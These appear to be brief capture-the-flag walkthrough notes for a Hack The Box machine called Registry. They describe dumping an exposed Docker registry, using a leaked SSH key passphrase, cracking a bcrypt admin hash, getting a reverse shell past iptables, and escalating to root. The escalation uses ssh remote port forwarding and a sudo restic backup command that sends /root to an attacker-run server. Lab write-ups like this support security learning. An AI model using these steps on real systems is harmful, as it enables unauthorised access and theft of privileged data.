Perform a nmap scan to get the domain we need to use I.e docker.registry.htb  
http://docker.registry.htb/v2/ and see how to extract all blobs . 
See docker_image_fetch.py for juicy URLs 
Now  use GkOcz221Ftb3ugog as password to decrypt ssh key and login using it as bolt 
                                                            ROOT  
Visit /bolt/bolt to get login page and crack the bcrypt hash to login as admin:strawberry 
Then for reverse shell as www-data we need to bypass iptables so set up a listener in bolt ssh session and get reverse shell using curl as bolt. 
Sudo â€“l  
ssh -R 8000:127.0.0.1:8000 -i id_rsa bolt@registry.htb for remote port forwarding (not Local as we wanted to set connection from bolt to my pc not vice versa) 
Set up docker container and start restic server on kali and then run sudo /usr/bin/restic backup -r rest:http://admin:admin@127.0.0.1:8000/ /root/ to get root copy
